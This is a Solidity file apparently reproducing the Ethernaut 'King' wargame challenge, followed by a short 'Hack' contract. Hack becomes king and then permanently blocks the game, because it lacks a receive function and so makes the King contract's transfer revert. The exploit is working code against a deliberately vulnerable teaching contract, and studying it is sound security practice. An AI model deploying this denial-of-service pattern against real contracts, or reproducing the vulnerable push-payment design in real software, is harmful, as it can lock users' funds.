// SPDX-License-Identifier: MIT

// the goal of this contract is to be the forever king
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
// solution.
// to hack this contract, we create a contract without a fallback option or receive functionality.
// call is used specifically. transfer or send will fail because of limited 2300 gas stipend. receive of King would require more than 2300 gas to execute successfully.

contract Hack{
    constructor(address payable _target)payable{
        uint256 prize = King(_target).prize();
        (bool success, ) = _target.call{value:prize}("");
        require(success, "failed at deployment");
    }
}